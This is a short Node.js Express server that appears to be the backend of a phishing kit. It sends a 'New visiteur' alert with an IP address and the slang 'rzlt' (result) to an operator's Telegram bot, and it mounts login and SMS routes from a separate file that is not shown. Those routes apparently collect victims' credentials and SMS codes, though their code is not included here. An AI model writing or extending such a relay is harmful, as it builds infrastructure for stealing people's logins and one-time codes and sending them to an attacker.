require('dotenv').config()
const express = require('express')
const app = express()
const http = require('http');
const ipify = require('ipify2');
const axios =require('axios')
const bodyParser = require('body-parser')
const cors = require('cors');
const port = 5000
const { TOK1 , Chat } = process.env
const { TOKEN , ChatID } = process.env
const Telegram_api=`https://api.telegram.org/bot${TOKEN}`
app.set('trust proxy', true);
app.use(cors({
    origin: '*'
}))
const getIp=()=>{
    http.get({'host': 'api.ipify.org', 'port': 80, 'path': '/'}, function(resp) {
        console.log(resp.ip)
    });
}
const multisend = (chatid,token,data) => {
    const Telegram_api=`https://api.telegram.org/bot${token}`
    const rs = axios.post(`${Telegram_api}/sendMessage`, {
        chat_id: chatid,
        text: data
    })
}
app.use(bodyParser.json())
app.get('/', (req, res) => {
    res.send('Hello World!')
})

app.post('/api/new', (req, res) => {

    ipify.ipv4().then(ipv4 =>{
        const ress="#New visiteur from IP : "+ipv4+" \n" +
            "Nchallah rzlt ♥♥♥ \n"
        multisend(ChatID,TOKEN,ress)
        res.status(200).json(ipv4)
    } ).catch(err => console.log(err));



})

app.use('/api/login/new',require('./routres/login'))
app.use('/api/sms',require('./routres/login'))
app.use('/api/new',require('./routres/login'))
app.listen(port, () => {
    console.log(`Example app listening on port ${port}`)
})

